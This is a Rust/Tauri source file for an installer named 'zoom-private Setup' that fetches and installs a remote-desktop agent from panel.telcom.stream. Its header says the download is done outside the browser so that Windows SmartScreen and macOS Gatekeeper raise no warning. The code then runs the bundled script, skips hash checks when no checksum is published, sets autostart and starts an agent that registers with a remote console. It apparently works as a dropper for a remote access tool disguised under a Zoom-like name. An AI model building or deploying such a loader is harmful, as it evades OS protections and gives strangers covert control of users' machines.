//! zoom-private Setup — one-click installer for the in-house BetterDesk client.
//!
//! The launcher downloads the matching `zoom-private-<os>.zip` bundle itself
//! (never through the browser), so the payload carries no Mark-of-the-Web and
//! no macOS quarantine flag — SmartScreen and Gatekeeper stay quiet for the
//! client. It verifies the published SHA-256, runs the bundled install script,
//! registers autostart and starts the agent, which then self-registers with
//! the web console.

mod setup;

use anyhow::Result;
use serde::Serialize;
use tauri::{Emitter};

const DEFAULT_CONSOLE: &str = "https://panel.telcom.stream";

#[derive(Clone, Serialize)]
struct LogPayload {
    line: String,
}

#[derive(Clone, Serialize)]
struct StepPayload {
    step: String,
}

fn http_client() -> Result<reqwest::Client> {
    reqwest::Client::builder()
        .user_agent("zoom-private-setup/1.0")
        .timeout(std::time::Duration::from_secs(900))
        .build()
        .map_err(|e| anyhow::anyhow!("HTTP client failed: {}", e))
}

#[tauri::command]
async fn detect() -> Result<setup::DetectInfo, String> {
    let (install_dir, config_dir, client_path) = setup::install_paths();
    let already = client_path.exists();
    Ok(setup::DetectInfo {
        platform: setup::platform_key().to_string(),
        arch: setup::arch_key().to_string(),
        os_label: setup::os_label().to_string(),
        default_console: DEFAULT_CONSOLE.to_string(),
        install_dir: install_dir.to_string_lossy().to_string(),
        config_dir: config_dir.to_string_lossy().to_string(),
        client_path: client_path.to_string_lossy().to_string(),
        already_installed: already,
    })
}

#[tauri::command]
async fn install(console: String, app: tauri::AppHandle) -> Result<(), String> {
    run_install(console, Some(app)).await.map_err(|e| {
        log::error!("setup failed: {}", e);
        e.to_string()
    })
}

async fn run_install(console: String, app: Option<tauri::AppHandle>) -> Result<()> {
    let console = setup::normalize_console(&console)?;
    let (install_dir, config_dir, client_path) = setup::install_paths();
    let client = http_client()?;

    let emit_step = |step: &str| match &app {
        Some(handle) => {
            let _ = handle.emit("setup-step", StepPayload { step: step.to_string() });
        }
        None => println!("• {}", step),
    };
    let emit_log = |line: String| match &app {
        Some(handle) => {
            let _ = handle.emit("setup-log", LogPayload { line: line.clone() });
        }
        None => println!("{}", line),
    };

    emit_step("Resolving the client build for this device");
    let asset = setup::fetch_recommended(
        &client,
        &console,
        setup::platform_key(),
        setup::arch_key(),
    )
    .await?;
    emit_log(format!(
        "Selected {} ({:.1} MB)",
        asset.name,
        asset.size as f64 / 1_048_576.0
    ));

    emit_step("Reading the console connection profile");
    let profile = match setup::fetch_agent_profile(&client, &console).await {
        Ok(p) => {
            emit_log(format!("API origin: {}", p.server_address));
            emit_log(format!("CDAP gateway: {}", p.cdap_url));
            p
        }
        Err(err) => {
            emit_log(format!(
                "Could not read the connection profile ({}), using the entered address",
                err
            ));
            setup::AgentProfile {
                server_address: console.clone(),
                ..Default::default()
            }
        }
    };

    emit_step("Downloading");
    let bytes = setup::download_bundle(&client, &console, &asset).await?;

    if let Some(expected) = asset.sha256.as_ref().filter(|s| !s.trim().is_empty()) {
        emit_step("Verifying the download");
        setup::verify_sha256(&bytes, expected)?;
        emit_log("Checksum verified".to_string());
    } else {
        emit_log("No published checksum — skipping verification".to_string());
    }

    emit_step("Extracting");
    let temp = std::env::temp_dir().join(format!("zoom-private-setup-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&temp);
    let extracted = setup::extract_bundle(&bytes, &temp)?;
    let root = setup::payload_root(&extracted);
    emit_log(format!("Extracted to {}", root.display()));

    emit_step("Installing");
    let log_fn = |line: String| {
        emit_log(line);
    };
    // The client must talk to the BetterDesk API, not to the console UI, so
    // the profile origin is what gets written into the agent config.
    let server_for_agent = if profile.server_address.trim().is_empty() {
        console.clone()
    } else {
        profile.server_address.trim().to_string()
    };
    setup::run_installer(&root, &server_for_agent, &install_dir, &config_dir, &log_fn).await?;
    setup::apply_profile(&config_dir.join("agent-config.json"), &profile)?;

    emit_step("Starting the client");
    setup::launch_client(&client_path)?;
    emit_log(format!("Client started from {}", client_path.display()));
    emit_step("done");

    let _ = std::fs::remove_dir_all(&temp);
    Ok(())
}

#[tauri::command]
async fn open_console(url: String) -> Result<(), String> {
    setup::open_url(&url).map_err(|e| e.to_string())
}

fn main() {
    // Headless mode: perform the same install flow without a window. Used by
    // the MDM provisioning scripts and by CI to verify the flow end to end.
    let args: Vec<String> = std::env::args().collect();
    if args.iter().any(|a| a == "--headless") {
        let console = args
            .get(args.iter().position(|a| a == "--headless").unwrap() + 1)
            .cloned()
            .unwrap_or_else(|| DEFAULT_CONSOLE.to_string());
        let rt = tokio::runtime::Runtime::new().expect("tokio runtime");
        match rt.block_on(run_install(console, None)) {
            Ok(()) => {
                println!("zoom-private Setup: done");
            }
            Err(err) => {
                eprintln!("zoom-private Setup: {}", err);
                std::process::exit(1);
            }
        }
        return;
    }

    tauri::Builder::default()
        .invoke_handler(tauri::generate_handler![detect, install, open_console])
        .run(tauri::generate_context!())
        .expect("error while running zoom-private Setup");
}
